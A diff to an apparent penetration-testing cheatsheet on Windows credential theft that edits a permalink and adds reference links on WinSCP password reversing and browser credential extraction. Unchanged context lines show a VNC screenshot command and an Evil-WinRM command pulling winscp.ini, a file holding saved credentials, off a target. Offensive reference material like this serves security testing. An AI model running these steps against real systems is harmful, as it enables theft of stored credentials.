@@ -4,7 +4,7 @@ title: TA0006 Credentials Steal - Windows
 category: pen
 parent: cheatsheets
 modified_date: 2023-06-08
-permalink: /pen/creds/win
+permalink: /pen/win/creds
 ---
 
 **Mitre Att&ck Entreprise**: [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
@@ -139,8 +139,13 @@ vncsnapshot 1.2.3.4 pwned_desktop_x.png
 ```sh
 Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
 ```
+[reverse-pwd](https://www.jonaslieb.com/blog/2012/12/23/reversing-the-winscp-session-password-encryption.html)
 
 ### <a name='putty'></a>putty
 
 ### <a name='browsers'></a>browsers
 - [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
+
+## sources
+
+* [synacktiv](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary) / 20-04-2023
